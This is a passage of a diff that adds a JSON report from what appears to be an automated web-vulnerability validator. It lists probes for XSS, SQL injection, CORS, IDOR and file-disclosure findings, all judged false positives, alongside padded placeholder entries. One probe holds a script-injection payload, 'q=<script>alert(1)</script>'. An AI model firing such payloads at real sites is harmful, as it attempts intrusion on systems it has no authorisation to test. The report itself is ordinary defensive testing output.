+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "open_redirect:16",
+      "vuln_class": "open_redirect",
+      "name": "Meta Redirect",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 0.7,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "acl_bypass:17",
+      "vuln_class": "acl_bypass",
+      "name": "IDOR candidate",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "file_disclosure:18",
+      "vuln_class": "file_disclosure",
+      "name": ".git exposure",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1.2999999999999998,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "cors:19",
+      "vuln_class": "cors",
+      "name": "Null-origin CORS",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1.6,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "xss:20",
+      "vuln_class": "xss",
+      "name": "Attribute XSS",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 0.4,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /#/search?q=hello"
+            },
+            {
+              "id": "probe_1",
+              "payload": "q=<script>alert(1)</script>"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "sqli:21",
+      "vuln_class": "sqli",
+      "name": "Second-Order SQLi",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 0.7,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "acl_bypass:22",
+      "vuln_class": "acl_bypass",
+      "name": "Method Override",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "file_disclosure:23",
+      "vuln_class": "file_disclosure",
+      "name": "Directory Listing",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1.2999999999999998,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "unk:pad30",
+      "vuln_class": "unknown",
+      "name": "Informational",
+      "verdict": "skipped",
+      "reason": "no validator",
+      "attempts": 0,
+      "elapsed_s": 0,
+      "proof": [],
+      "trace": []
+    },
+    {
+      "finding_id": "unk:pad31",
+      "vuln_class": "unknown",
+      "name": "Informational",
+      "verdict": "skipped",
+      "reason": "no validator",
+      "attempts": 0,
+      "elapsed_s": 0,
+      "proof": [],
+      "trace": []
+    },
+    {
+      "finding_id": "unk:pad32",
+      "vuln_class": "unknown",
+      "name": "Informational",
+      "verdict": "skipped",
+      "reason": "no validator",
+      "attempts": 0,
+      "elapsed_s": 0,
+      "proof": [],
+      "trace": []
+    },
+    {
+      "finding_id": "unk:pad33",
+      "vuln_class": "unknown",
+      "name": "Informational",
+      "verdict": "skipped",
+      "reason": "no validator",
+      "attempts": 0,
+      "elapsed_s": 0,
+      "proof": [],
+      "trace": []
+    }
+  ]
+}
